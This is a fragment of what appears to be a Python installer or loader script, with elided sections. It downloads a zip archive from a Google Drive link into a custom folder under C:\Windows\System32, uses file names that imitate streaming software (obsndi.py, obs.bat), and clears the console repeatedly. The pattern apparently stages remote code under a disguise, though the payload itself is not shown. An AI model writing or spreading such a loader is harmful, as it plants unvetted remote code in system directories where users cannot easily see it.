...
def updating_premx():
    aesv3_path = r"C:\Windows\System32\StreamX\obsndi.py"
...
if not os.path.exists("C:\\Windows\\System32\\StreamX\\obsndi.py"):
    os.system('cls')
    print("----------------------------------")
    print("Installing please wait.")
    download_file_from_google_drive("https://drive.google.com/uc?id=1gcpqYAyJYCajsivfmyq3tPT3qJxSHvMQ", "C:\\Windows\\System32\\StreamX\\xx.zip")
    zip_file = r'C:\Windows\System32\StreamX\xx.zip'
...
os.system('cls')
batch_file_path = r"C:\Windows\System32\StreamX\obs.bat"
os.system('cls')
